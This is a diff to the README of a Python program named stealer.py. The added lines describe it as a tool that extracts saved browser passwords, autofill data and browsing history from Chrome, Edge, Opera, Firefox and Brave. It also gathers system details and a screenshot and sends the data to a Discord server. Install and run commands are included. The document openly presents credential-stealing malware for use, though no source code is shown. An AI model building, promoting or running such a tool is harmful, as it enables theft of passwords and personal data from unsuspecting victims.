@@ -11,7 +11,7 @@ Instagram: [Capture the Root](https://www.instagram.com/capturetheroot/)
 
 ## 🧰  Features  🧰
 
-
+This is a Python program that extracts saved passwords and autofill information from browsers such as Google Chrome, Microsoft Edge, Opera, Firefox, and Brave. The program can also get system information such as the operating system, username, PC name, IP address, and processor.It sends the extracted data and and screenshot to the discord server using discord tokens.
 
 
 ## 📀 Installation 📀
@@ -28,7 +28,11 @@ pip3 install -r requirements.txt
 ```bash
 python3 stealer.py
 ```
+Wait for the program to finish. The extracted information will be saved to the following files:
 
+    * pwd.txt (saved passwords)
+    * web.txt (autofill information)
+    * history.txt (browsing history)
 
 
 ## Bugs and enhancements
